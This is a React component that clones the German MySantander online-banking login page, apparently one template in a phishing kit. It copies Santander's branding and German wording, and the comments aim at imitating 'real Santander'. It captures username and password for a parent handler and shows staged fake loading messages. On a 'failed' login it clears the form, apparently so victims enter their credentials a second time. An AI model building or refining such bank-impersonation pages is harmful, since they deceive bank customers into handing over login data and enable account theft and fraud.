import React, { useState, useEffect, useRef } from 'react';
import Loading from './Loading';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  showError?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, showError = false }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [isMobile, setIsMobile] = useState(false);
  
  const usernameRef = useRef<HTMLInputElement>(null);
  
  // Check for mobile screen size with Chrome-specific handling
  useEffect(() => {
    const checkMobile = () => {
      // Chrome mobile detection - more reliable
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile); // Chrome mobile orientation fix
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);
  
  // Auto-focus the username field on component mount
  useEffect(() => {
    if (usernameRef.current) {
      usernameRef.current.focus();
    }
  }, []);

  // Clear form fields when error is shown (like real Santander)
  useEffect(() => {
    if (showError) {
      setUsername('');
      setPassword('');
      setShowPassword(false);
      // Focus back to username field
      if (usernameRef.current) {
        usernameRef.current.focus();
      }
    }
  }, [showError]);

  // Handle form submission with realistic loading times
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim() || !password.trim()) {
      return;
    }
    
    setIsLoading(true);
    setAttemptCount(prev => prev + 1);
    
    // Set appropriate loading message based on attempt
    if (attemptCount === 0) {
      setLoadingMessage('Anmeldedaten werden überprüft');
      // First attempt: 2-3 seconds
      await new Promise(resolve => setTimeout(resolve, 2500));
    } else {
      setLoadingMessage('Sicherheitsanalyse läuft');
      // Second attempt: 3-4 seconds
      await new Promise(resolve => setTimeout(resolve, 3500));
    }
    
    try {
      // Call the parent's onSubmit function
      await onSubmit({ username: username.trim(), password: password.trim() });
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      {/* Chrome-specific mobile fixes */}
      <style>
        {`
          /* Chrome mobile viewport fix */
          @media screen and (-webkit-min-device-pixel-ratio: 0) {
            html, body {
              -webkit-text-size-adjust: 100%;
              -webkit-font-smoothing: antialiased;
            }
          }
          
          /* Chrome mobile layout fixes */
          @supports (-webkit-appearance: none) {
            .chrome-mobile-fix {
              -webkit-transform: translateZ(0);
              transform: translateZ(0);
              -webkit-backface-visibility: hidden;
              backface-visibility: hidden;
            }
          }
          
          /* Chrome flexbox fixes for mobile */
          @media (max-width: 768px) {
            .chrome-flex-container {
              display: -webkit-box !important;
              display: -webkit-flex !important;
              display: flex !important;
              -webkit-box-orient: vertical !important;
              -webkit-box-direction: normal !important;
              -webkit-flex-direction: column !important;
              flex-direction: column !important;
              width: 100% !important;
              min-height: 100vh !important;
              padding: 0 1.5rem !important;
              box-sizing: border-box !important;
            }
            
            .chrome-flex-item {
              -webkit-box-flex: 1 !important;
              -webkit-flex: 1 !important;
              flex: 1 !important;
              width: 100% !important;
              max-width: 100% !important;
              min-width: 100% !important;
              box-sizing: border-box !important;
            }
            
            /* Ensure text doesn't get cut off */
            * {
              word-wrap: break-word !important;
              overflow-wrap: break-word !important;
            }
          }
          
          /* Chrome input field fixes */
          @supports (-webkit-appearance: none) {
            input[type="text"], input[type="password"] {
              -webkit-appearance: none;
              -webkit-border-radius: 0;
              border-radius: 0;
            }
          }
        `}
      </style>
      
      {isLoading && (
        <Loading 
          message={loadingMessage}
          type="login"
          showProgress={true}
          duration={attemptCount === 0 ? 2.5 : 3.5}
        />
      )}
      
      <div 
        className={isMobile ? "chrome-mobile-fix chrome-flex-container" : "santander-container"}
        style={{ 
          minHeight: '80vh',
          display: 'flex',
          alignItems: 'flex-start',
          paddingTop: isMobile ? '1rem' : '4rem',
          position: 'relative',
          boxSizing: 'border-box',
          width: '100%',
          WebkitBoxSizing: 'border-box'
        } as React.CSSProperties}>
        
        <div style={{
          display: 'flex',
          width: '100%',
          alignItems: 'flex-start',
          flexDirection: isMobile ? 'column' : 'row',
          gap: isMobile ? '2rem' : '6rem',
          boxSizing: 'border-box'
        } as React.CSSProperties}>
          {/* Left side - Login Form */}
          <div 
            className={isMobile ? "chrome-flex-item" : ""}
            style={{ 
              flex: '1', 
              maxWidth: isMobile ? '100%' : '500px',
              width: '100%',
              boxSizing: 'border-box'
            } as React.CSSProperties}>
            {/* Welcome Title */}
            <h1 style={{ 
              fontSize: isMobile ? '1.75rem' : '2.25rem',
              fontWeight: '600', 
              color: '#444', 
              marginBottom: '0.5rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif',
              lineHeight: '1.2'
            } as React.CSSProperties}>
              Willkommen bei MySantander
            </h1>
            
            {/* Subtitle with link */}
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: isMobile ? '2rem' : '2.5rem',
              fontFamily: 'santander_regular, Arial, sans-serif',
              lineHeight: '1.4'
            }}>
              Ihrem Online Banking Portal - weitere Informationen finden Sie{' '}
              <a href="#" style={{
                color: '#9e3667',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                hier
              </a>.
            </p>
            
            {showError && (
              <div style={{
                backgroundColor: '#fce4e4',
                border: '1px solid #fcc2c3',
                borderRadius: '8px',
                padding: '16px',
                marginBottom: '2rem',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '12px'
              }}>
                <div style={{
                  flexShrink: 0,
                  marginTop: '2px'
                }}>
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 20 20">
                    <path fill="#900" fillRule="evenodd" d="M10 0c2.67 0 5.183 1.04 7.071 2.93 3.899 3.898 3.899 10.242 0 14.14A9.934 9.934 0 0110 20a9.934 9.934 0 01-7.071-2.93C-.97 13.173-.97 6.829 2.929 2.93A9.934 9.934 0 0110 0zm0 1a8.94 8.94 0 00-6.364 2.636c-3.509 3.509-3.509 9.219 0 12.728A8.94 8.94 0 0010 19a8.94 8.94 0 006.364-2.636c3.509-3.509 3.509-9.219 0-12.728A8.94 8.94 0 0010 1ZM6.396 5.7a.5.5 0 00-.638.764L9.293 10l-3.535 3.536-.058.069a.5.5 0 00.765.638L10 10.707l3.535 3.536.079.064a.5.5 0 00.628-.771L10.707 10l3.535-3.536.058-.069a.5.5 0 00-.765-.638L10 9.293 6.465 5.757l-.07-.058z" clipRule="evenodd"></path>
                  </svg>
                </div>
                <div style={{
                  flex: 1
                }}>
                  <p style={{
                    color: '#cc0000',
                    fontSize: '14px',
                    margin: 0,
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    fontWeight: '600',
                    marginBottom: '4px'
                  }}>
                    Ihr Login war nicht erfolgreich. Bitte überprüfen Sie Ihre Eingabe. Bitte beachten Sie: Wiederholte Fehleingaben können zur Sperre Ihrer Zugangsdaten führen.
                  </p>
                </div>
              </div>
            )}
            
            <form onSubmit={handleSubmit}>
              {/* Username Field */}
              <div style={{ marginBottom: '1.5rem', position: 'relative' }}>
                <div style={{
                  position: 'relative',
                  border: '1px solid #d1d8d9',
                  borderRadius: '4px',
                  backgroundColor: 'white'
                }}>
                  <input
                    id="username"
                    name="username"
                    type="text"
                    placeholder="Benutzerkennung"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    style={{
                      width: '100%',
                      padding: '16px 48px 16px 16px',
                      border: 'none',
                      borderRadius: '4px',
                      backgroundColor: 'transparent',
                      fontSize: '16px',
                      color: '#444',
                      outline: 'none',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}
                    ref={usernameRef}
                    autoFocus
                  />
                  <div style={{
                    position: 'absolute',
                    right: '16px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    color: '#9ca3af'
                  }}>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                      <circle cx="12" cy="7" r="4"/>
                    </svg>
                  </div>
                </div>
              </div>
                
              {/* Password Field */}
              <div style={{ marginBottom: '1rem', position: 'relative' }}>
                <div style={{
                  position: 'relative',
                  border: '1px solid #d1d8d9',
                  borderRadius: '4px',
                  backgroundColor: 'white'
                }}>
                  <input
                    id="password"
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Passwort"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    style={{
                      width: '100%',
                      padding: '16px 48px 16px 16px',
                      border: 'none',
                      borderRadius: '4px',
                      backgroundColor: 'transparent',
                      fontSize: '16px',
                      color: '#444',
                      outline: 'none',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: 'absolute',
                      right: '16px',
                      top: '50%',
                      transform: 'translateY(-50%)',
                      background: 'none',
                      border: 'none',
                      cursor: 'pointer',
                      color: '#9ca3af',
                      padding: '0'
                    }}
                    tabIndex={-1}
                  >
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                      {showPassword ? (
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                      ) : (
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                      )}
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  </button>
                </div>
              </div>

              {/* Passwort zurücksetzen link */}
              <div style={{ marginBottom: '1.5rem', textAlign: 'left' }}>
                <a href="#" style={{
                  color: '#9e3667',
                  textDecoration: 'none',
                  fontSize: '14px',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  Passwort zurücksetzen
                </a>
              </div>

              {/* Login Button - Primary Style */}
              <div style={{ marginBottom: '1rem' }}>
                <button
                  type="submit"
                  style={{
                    backgroundColor: '#9e3667',
                    color: 'white',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '16px 24px',
                    fontSize: '16px',
                    fontWeight: '600',
                    cursor: 'pointer',
                    fontFamily: 'santander_bold, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    display: 'block',
                    textAlign: 'center',
                    width: '100%',
                    boxShadow: 'none',
                    textTransform: 'none',
                    letterSpacing: 'normal'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#8a2f5a';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#9e3667';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                  }}
                >
                  {isLoading ? 'Wird verarbeitet...' : 'Einloggen'}
                </button>
              </div>

              {/* Signaturverfahren einrichten link */}
              <div style={{ marginBottom: '2rem', textAlign: 'center' }}>
                <a href="#" style={{
                  color: '#9e3667',
                  textDecoration: 'none',
                  fontSize: '14px',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  Signaturverfahren einrichten
                </a>
              </div>

              {/* MySantander Registrierung Section */}
              <div style={{ 
                marginBottom: '2rem',
                padding: '1.5rem 0',
                borderTop: '1px solid #e5e7eb'
              }}>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#444',
                  margin: '0 0 0.5rem 0',
                  fontFamily: 'santander_bold, Arial, sans-serif'
                }}>
                  Sie haben noch keinen Zugang?
                </h3>
                <p style={{
                  fontSize: '14px',
                  color: '#666',
                  margin: '0 0 1.5rem 0',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  lineHeight: '1.4'
                }}>
                  Als Kreditkunde können Sie die Registrierung für das MySantander Online Banking ganz bequem von zu Hause aus erledigen und Ihre Bankgeschäfte von zu Hause aus erledigen!
                </p>
                <button
                  type="button"
                  style={{
                    backgroundColor: 'transparent',
                    color: '#9e3667',
                    border: '2px solid #9e3667',
                    borderRadius: '4px',
                    padding: '16px 24px',
                    fontSize: '16px',
                    fontWeight: '600',
                    cursor: 'pointer',
                    fontFamily: 'santander_bold, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    display: 'block',
                    textAlign: 'center',
                    width: '100%',
                    boxShadow: 'none',
                    textTransform: 'none',
                    letterSpacing: 'normal'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#9e3667';
                    (e.target as HTMLButtonElement).style.color = 'white';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                    (e.target as HTMLButtonElement).style.color = '#9e3667';
                  }}
                >
                  MySantander Registrierung
                </button>
              </div>
            </form>
          </div>
          
          {/* Right side - Illustration */}
          {!isMobile && (
            <div style={{ 
              flex: '1', 
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              minHeight: '600px'
            }}>
              <div style={{
                width: '500px',
                height: '500px',
                backgroundImage: 'url(/templates/santander/images/home-login.png)',
                backgroundSize: 'contain',
                backgroundRepeat: 'no-repeat',
                backgroundPosition: 'center'
              }} />
            </div>
          )}
        </div>
      </div>
    </>
  );
};

export default LoginForm; 